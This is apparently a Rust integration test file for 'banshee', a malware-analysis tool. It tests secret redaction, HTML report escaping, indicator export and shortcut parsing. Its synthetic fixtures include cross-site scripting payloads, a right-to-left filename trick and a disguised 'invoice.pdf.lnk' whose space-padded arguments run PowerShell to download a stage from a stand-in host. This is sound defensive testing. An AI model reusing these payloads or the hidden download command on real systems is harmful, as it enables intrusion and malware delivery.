use assert_cmd::Command;
use std::path::PathBuf;
use std::process::Stdio;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

struct Fixture(PathBuf);
impl Fixture {
    fn new(name: &str) -> Self {
        let path = std::env::temp_dir().join(format!(
            "banshee-security-{name}-{}-{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir(&path).unwrap();
        Self(path)
    }
}
impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

#[test]
fn clipped_rule_context_must_not_leak_password_fragment() {
    let f = Fixture::new("redaction");
    let rules = f.0.join("rules.toml");
    std::fs::write(
        &rules,
        "version=1\n[[rules]]\nid='marker'\nkind='literal'\npattern='TAILMARK'\n",
    )
    .unwrap();
    // Synthetic credential only. The assignment prefix falls outside the preview window.
    let input = "password = abcdefghijklmnopqrstuvwxyzTAILMARK";
    let report = banshee::rules::scan(&rules, input.as_bytes()).unwrap();
    assert!(
        !report.matches[0].samples[0]
            .preview
            .contains("opqrstuvwxyz"),
        "Password suffix remains in rule preview"
    );
}

#[test]
fn concurrent_target_creation_must_not_be_overwritten_without_force() {
    let f = Fixture::new("publish");
    let source = f.0.join("sample.txt");
    std::fs::write(&source, "hello ".repeat(100_000)).unwrap();
    let target = f.0.join("bundle");
    let binary = assert_cmd::cargo::cargo_bin("banshee");
    let mut child = std::process::Command::new(binary)
        .args(["evidence", "create"])
        .arg(source)
        .arg("--output")
        .arg(&target)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    let start = Instant::now();
    let mut staged = false;
    while start.elapsed() < Duration::from_secs(10) {
        if std::fs::read_dir(&f.0).unwrap().any(|entry| {
            entry
                .unwrap()
                .file_name()
                .to_string_lossy()
                .starts_with(".bundle.banshee-staging-")
        }) {
            staged = true;
            break;
        }
        if child.try_wait().unwrap().is_some() {
            break;
        }
        std::thread::sleep(Duration::from_millis(1));
    }
    if !staged {
        let _ = child.kill();
        let _ = child.wait();
        panic!("Could not observe staging; race test inconclusive");
    }
    std::fs::create_dir(&target).unwrap();
    std::fs::write(target.join("keep.txt"), b"concurrently created user data").unwrap();
    let status = child.wait().unwrap();
    assert!(
        target.join("keep.txt").exists(),
        "Concurrent target deleted without --force; exit={:?}",
        status.code()
    );
}

#[test]
fn diff_must_mask_secret_values_from_saved_reports() {
    let f = Fixture::new("diff-secret");
    let source = f.0.join("sample.txt");
    std::fs::write(&source, b"hello").unwrap();
    let output = Command::cargo_bin("banshee")
        .unwrap()
        .arg("report")
        .arg(source)
        .args(["--format", "json"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let left: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let mut right = left.clone();
    right["content_analysis"]["report"]["iocs"]["iocs"] = serde_json::json!([
        {"kind":"secret","value":"password = SyntheticAuditSecret123","occurrences":1}
    ]);
    let a = f.0.join("a.json");
    let b = f.0.join("b.json");
    std::fs::write(&a, serde_json::to_vec(&left).unwrap()).unwrap();
    std::fs::write(&b, serde_json::to_vec(&right).unwrap()).unwrap();
    let output = Command::cargo_bin("banshee")
        .unwrap()
        .arg("diff")
        .arg(a)
        .arg(b)
        .arg("--json")
        .output()
        .unwrap();
    assert!(
        !String::from_utf8_lossy(&output.stdout).contains("SyntheticAuditSecret123"),
        "Diff re-emits secret from input report"
    );
}

#[test]
fn local_inputs_must_respect_size_limits_before_parsing() {
    let f = Fixture::new("input-limits");
    let certificate = f.0.join("large.pem");
    let mut oversized = b"-----BEGIN CERTIFICATE-----\n".to_vec();
    oversized.resize(4 * 1024 * 1024 + 1, b'A');
    std::fs::write(&certificate, &oversized).unwrap();
    let error = banshee::cert::inspect_file(&certificate)
        .unwrap_err()
        .to_string();
    assert!(error.contains("4 MiB safety limit"), "{error}");
    assert!(banshee::cert::inspect_bytes(&oversized).is_err());

    let list = f.0.join("allow.txt");
    std::fs::write(&list, vec![b'a'; 4 * 1024 * 1024 + 1]).unwrap();
    assert!(banshee::ioc::PatternList::from_files(&[&list]).is_err());

    let rules = "x".repeat(1024 * 1024 + 1);
    assert!(banshee::rules::validate_source(&rules).is_err());
}

#[test]
fn in_memory_rule_source_matches_file_rule_behavior() {
    let f = Fixture::new("rule-source");
    let source = "version=1\n[[rules]]\nid='marker'\nkind='literal'\npattern='MARKER'\n";
    let path = f.0.join("rules.toml");
    std::fs::write(&path, source).unwrap();
    let input = b"prefix MARKER suffix MARKER";

    let from_file = banshee::rules::scan(&path, input).unwrap();
    let from_source = banshee::rules::scan_source(source, input).unwrap();
    assert_eq!(
        serde_json::to_value(&from_file).unwrap(),
        serde_json::to_value(&from_source).unwrap()
    );
    assert_eq!(
        banshee::rules::validate_source(source).unwrap().rule_count,
        1
    );
}

#[test]
fn html_report_must_escape_sample_content_and_forbid_active_content() {
    let f = Fixture::new("html-report");
    let sample = f.0.join("sample.log");
    // Synthetic markup and credential only; nothing here is executed.
    std::fs::write(
        &sample,
        "GET http://evil.example.test/<script>alert(1)</script>\n\
         id=\"><img src=x onerror=alert(2)> from 192.0.2.7\n\
         name \u{202e}gpj.exe\n\
         aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
    )
    .unwrap();
    let rules = f.0.join("rules.toml");
    std::fs::write(
        &rules,
        "version=1\n[[rules]]\nid='marker'\ndescription='<b onclick=x>desc</b>'\n\
         kind='literal'\npattern='alert'\nreferences=['javascript:alert(3)']\n",
    )
    .unwrap();

    let output = Command::cargo_bin("banshee")
        .unwrap()
        .arg("report")
        .arg(&sample)
        .arg("--rules")
        .arg(&rules)
        .args(["--format", "html"])
        .output()
        .unwrap();
    assert!(output.status.success(), "{output:?}");
    let html = String::from_utf8(output.stdout).unwrap();

    assert!(html.starts_with("<!doctype html>"));
    assert!(html.contains("Content-Security-Policy\" content=\"default-src 'none'"));
    for forbidden in [
        "<script",
        "<img",
        "<b onclick",
        "<a ",
        "href=",
        "\u{202e}",
        "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    ] {
        assert!(
            !html.contains(forbidden),
            "HTML report contains {forbidden:?}"
        );
    }
    assert!(html.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
    assert!(
        html.contains("javascript:alert(3)"),
        "references stay inert text"
    );
}

#[test]
fn exports_must_contain_observables_only_and_never_redacted_secrets() {
    let f = Fixture::new("export");
    let sample = f.0.join("sample.log");
    let secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
    std::fs::write(
        &sample,
        format!(
            "beacon http://c2.example.test/a from 192.0.2.9\n\
             aws_secret_access_key = {secret}\n\
             md5 44d88612fea8a8f36de82e1f4d6c1b0f\n"
        ),
    )
    .unwrap();
    let report = f.0.join("report.json");
    Command::cargo_bin("banshee")
        .unwrap()
        .arg("--output")
        .arg(&report)
        .arg("report")
        .arg(&sample)
        .args(["--format", "json"])
        .assert()
        .success();
    let bundle = f.0.join("bundle");
    Command::cargo_bin("banshee")
        .unwrap()
        .args(["evidence", "create"])
        .arg(&sample)
        .arg("--output")
        .arg(&bundle)
        .assert()
        .success();

    let run = |input: &std::path::Path, format: &str| {
        let output = Command::cargo_bin("banshee")
            .unwrap()
            .arg("export")
            .arg(input)
            .args(["--format", format])
            .output()
            .unwrap();
        assert!(output.status.success(), "{format}: {output:?}");
        let text = String::from_utf8(output.stdout).unwrap();
        assert!(!text.contains(secret), "{format} export leaked a secret");
        assert!(
            !text.contains("REDACTED"),
            "{format} exported a masked value"
        );
        text
    };

    let stix: serde_json::Value = serde_json::from_str(&run(&report, "stix")).unwrap();
    assert_eq!(stix["type"], "bundle");
    let objects = stix["objects"].as_array().unwrap();
    assert!(objects.iter().all(|object| object["type"] != "indicator"));
    let grouping = objects
        .iter()
        .find(|object| object["type"] == "grouping")
        .unwrap();
    assert_eq!(
        grouping["object_refs"].as_array().unwrap().len(),
        objects.len() - 1
    );
    assert!(
        objects
            .iter()
            .any(|object| object["type"] == "url" && object["value"] == "http://c2.example.test/a")
    );
    // Deterministic SCO identifiers do not depend on export time.
    let again: serde_json::Value = serde_json::from_str(&run(&bundle, "stix")).unwrap();
    assert_eq!(stix["id"], again["id"]);

    let misp: serde_json::Value = serde_json::from_str(&run(&report, "misp")).unwrap();
    let attributes = misp["Event"]["Attribute"].as_array().unwrap();
    assert!(
        attributes
            .iter()
            .all(|attribute| attribute["to_ids"] == false)
    );
    assert!(
        attributes
            .iter()
            .any(|attribute| attribute["type"] == "ip-dst" && attribute["value"] == "192.0.2.9")
    );

    let csv = run(&report, "csv");
    assert!(csv.starts_with("type,value,occurrences,source\n"));
    assert!(csv.contains("\nmd5,44d88612fea8a8f36de82e1f4d6c1b0f,1,sample.log\n"));
}

#[test]
fn shortcut_reports_surface_hidden_arguments_and_their_indicators() {
    let f = Fixture::new("lnk-report");
    let utf16 = |value: &str| {
        let units = value.encode_utf16().collect::<Vec<_>>();
        let mut output = (units.len() as u16).to_le_bytes().to_vec();
        output.extend(units.iter().flat_map(|unit| unit.to_le_bytes()));
        output
    };
    // Synthetic shortcut: HasArguments | IsUnicode, arguments padded with spaces.
    let mut shortcut = vec![0_u8; 0x4C];
    shortcut[..4].copy_from_slice(&0x4C_u32.to_le_bytes());
    shortcut[4..20].copy_from_slice(&[
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ]);
    shortcut[0x14..0x18].copy_from_slice(&(0x20_u32 | 0x80).to_le_bytes());
    shortcut.extend(utf16(&format!(
        "{}/c powershell -nop -c iwr http://hidden.example.test/stage",
        " ".repeat(64)
    )));
    let path = f.0.join("invoice.pdf.lnk");
    std::fs::write(&path, &shortcut).unwrap();

    let output = Command::cargo_bin("banshee")
        .unwrap()
        .arg("report")
        .arg(&path)
        .args(["--format", "json"])
        .output()
        .unwrap();
    assert!(output.status.success(), "{output:?}");
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["file"]["format"], "Windows shortcut (LNK)");
    let findings = report["file"]["findings"].to_string();
    assert!(
        findings.contains("start with 64 whitespace characters"),
        "{findings}"
    );
    assert!(findings.contains("powershell"), "{findings}");
    let iocs = report["content_analysis"]["report"]["iocs"]["iocs"]
        .as_array()
        .unwrap();
    let url = iocs
        .iter()
        .find(|ioc| ioc["value"] == "http://hidden.example.test/stage")
        .expect("argument URL becomes an indicator");
    assert!(
        url["source"]
            .as_str()
            .unwrap()
            .ends_with("(document metadata)")
    );
    assert!(url["first_line"].is_null());
}

#[test]
fn parallel_scans_must_match_sequential_output_and_size_budget() {
    let f = Fixture::new("parallel-scan");
    for index in 0..24 {
        let body = format!(
            "file {index} http://host{index}.example.test/ {}\n",
            "aGVsbG8gd29ybGQ=".repeat(index % 5 + 1)
        );
        std::fs::write(f.0.join(format!("sample-{index:02}.txt")), body).unwrap();
    }
    let scan = |jobs: &str| {
        let output = Command::cargo_bin("banshee")
            .unwrap()
            .arg("scan")
            .arg(&f.0)
            .args([
                "--format",
                "json",
                "--max-total-size",
                "1500",
                "--jobs",
                jobs,
            ])
            .output()
            .unwrap();
        assert!(
            output.status.code().is_some_and(|code| code <= 1),
            "{output:?}"
        );
        output.stdout
    };
    let sequential = scan("1");
    for jobs in ["2", "3", "8"] {
        assert_eq!(scan(jobs), sequential, "--jobs {jobs} changed the report");
    }
    let report: serde_json::Value = serde_json::from_slice(&sequential).unwrap();
    assert_eq!(report["summary"]["total_size_limit_reached"], true);
    assert!(report["summary"]["bytes_analyzed"].as_u64().unwrap() <= 1500);
}

#[test]
fn ssdeep_digests_compare_related_samples_and_appear_in_diffs() {
    let f = Fixture::new("ssdeep");
    let mut state = 0x9e37_79b9_u64;
    let original = (0..80_000)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            b"abcdefghij klmnopqrstuvwxyz\n0123456789"[(state % 38) as usize]
        })
        .collect::<Vec<_>>();
    let mut variant = original.clone();
    variant[40_000..40_012].copy_from_slice(b"VARIANT-EDIT");
    let left = f.0.join("left.txt");
    let right = f.0.join("right.txt");
    std::fs::write(&left, &original).unwrap();
    std::fs::write(&right, &variant).unwrap();

    let digest = |path: &std::path::Path| {
        let output = Command::cargo_bin("banshee")
            .unwrap()
            .args(["hash", "ssdeep", "--file"])
            .arg(path)
            .output()
            .unwrap();
        assert!(output.status.success());
        String::from_utf8(output.stdout).unwrap().trim().to_owned()
    };
    let (left_digest, right_digest) = (digest(&left), digest(&right));
    assert_ne!(left_digest, right_digest);
    let compared = Command::cargo_bin("banshee")
        .unwrap()
        .args(["hash", "compare-ssdeep", &left_digest, &right_digest])
        .output()
        .unwrap();
    let score: u8 = String::from_utf8(compared.stdout)
        .unwrap()
        .trim()
        .parse()
        .unwrap();
    assert!(score >= 80, "score {score}");

    let mut reports = Vec::new();
    for path in [&left, &right] {
        let report = f.0.join(format!(
            "{}.json",
            path.file_stem().unwrap().to_string_lossy()
        ));
        Command::cargo_bin("banshee")
            .unwrap()
            .arg("--output")
            .arg(&report)
            .arg("report")
            .arg(path)
            .args(["--format", "json"])
            .assert()
            .success();
        reports.push(report);
    }
    let diff = Command::cargo_bin("banshee")
        .unwrap()
        .arg("diff")
        .args(&reports)
        .arg("--json")
        .output()
        .unwrap();
    let diff: serde_json::Value = serde_json::from_slice(&diff.stdout).unwrap();
    assert_eq!(diff["ssdeep_similarity"].as_u64(), Some(u64::from(score)));
}
